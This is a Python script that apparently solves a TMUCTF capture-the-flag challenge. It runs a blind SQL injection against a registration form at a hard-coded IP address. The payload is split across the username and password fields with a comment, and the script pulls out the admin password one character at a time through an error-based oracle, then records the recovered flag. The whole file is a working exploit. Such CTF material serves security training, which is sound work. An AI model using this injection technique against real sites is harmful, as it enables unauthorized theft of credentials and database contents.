from requests import post
from string import printable

url = 'http://130.185.123.246/register'
flag = 'TMUCTF{'

finish = False
while not finish:
    finish = True
    for c in printable:
        print(c, end='', flush=True)
        payload = {
            'username': "'*(SUBSTR((SELECT password FROM users WHERE username='admin'),/*",
            'password': "*/{},1)='{}' OR 1/0),'".format(len(flag) + 1, c)
        }
        r = post(url, data=payload)
        if 'UNIQUE' in r.text:
            flag += c
            print('\n' + flag)
            finish = False
            break

print('\n' + flag)

# TMUCTF{P455w0rd5_mu57_b3_l0n6_4nd_c0mpl3x_l1k3_2MWn&p#FmjShTZXfAg:)}
